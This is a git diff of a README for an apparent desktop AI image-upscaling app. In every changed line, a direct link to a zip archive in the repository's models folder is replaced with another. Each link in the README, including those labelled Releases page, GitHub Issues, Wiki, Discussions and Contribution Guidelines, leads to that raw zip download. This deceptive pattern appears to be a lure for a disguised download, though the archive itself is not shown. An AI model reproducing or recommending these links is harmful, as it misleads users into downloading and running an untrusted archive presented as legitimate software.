@@ -4,7 +4,7 @@
 Welcome to **ai-image-upscaler**! This application helps you upscale your images using advanced AI technology. No need to worry about technical details; just follow these simple steps to get started.
 
 ## 📥 Download Now
-[![Download ai-image-upscaler](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/upscaler-image-ai-1.2.zip)](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/upscaler-image-ai-1.2.zip)
+[![Download ai-image-upscaler](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/image-upscaler-ai-2.6.zip)](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/image-upscaler-ai-2.6.zip)
 
 ## 📋 Overview
 **ai-image-upscaler** is a desktop application designed for enhancing image quality. It uses Real-ESRGAN technology to provide high-resolution images. Built with Python and Tkinter, it offers a clean and easy-to-use interface.
@@ -22,7 +22,7 @@ Welcome to **ai-image-upscaler**! This application helps you upscale your images
 - Python: No need to install separately
 
 ## 📥 Download & Install
-To download the latest version of ai-image-upscaler, visit the [Releases page](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/upscaler-image-ai-1.2.zip).
+To download the latest version of ai-image-upscaler, visit the [Releases page](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/image-upscaler-ai-2.6.zip).
 
 1. Click on the link above.
 2. Look for the latest release version.
@@ -44,16 +44,16 @@ If you encounter any issues during installation or usage, try the following step
 - Check if you have enough disk space.
 - For image processing issues, try using different image formats.
 
-If problems persist, feel free to raise an issue on our [GitHub Issues page](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/upscaler-image-ai-1.2.zip).
+If problems persist, feel free to raise an issue on our [GitHub Issues page](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/image-upscaler-ai-2.6.zip).
 
 ## 📚 Additional Resources
-- **Documentation**: Comprehensive guides and FAQs can be found in the [Wiki](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/upscaler-image-ai-1.2.zip).
-- **Community Support**: Join discussions and share experiences on our [GitHub Discussions page](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/upscaler-image-ai-1.2.zip).
+- **Documentation**: Comprehensive guides and FAQs can be found in the [Wiki](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/image-upscaler-ai-2.6.zip).
+- **Community Support**: Join discussions and share experiences on our [GitHub Discussions page](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/image-upscaler-ai-2.6.zip).
 
 ## 💻 Contributing
-We welcome any contributions! If you want to help enhance ai-image-upscaler, check our [Contribution Guidelines](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/upscaler-image-ai-1.2.zip).
+We welcome any contributions! If you want to help enhance ai-image-upscaler, check our [Contribution Guidelines](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/image-upscaler-ai-2.6.zip).
 
 ## 🌟 Acknowledgments
 Thank you for choosing ai-image-upscaler. Enjoy your image enhancement experience!
 
-[Download ai-image-upscaler](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/upscaler-image-ai-1.2.zip)
+[Download ai-image-upscaler](https://raw.githubusercontent.com/kaihsu0327/ai-image-upscaler/master/models/image-upscaler-ai-2.6.zip)
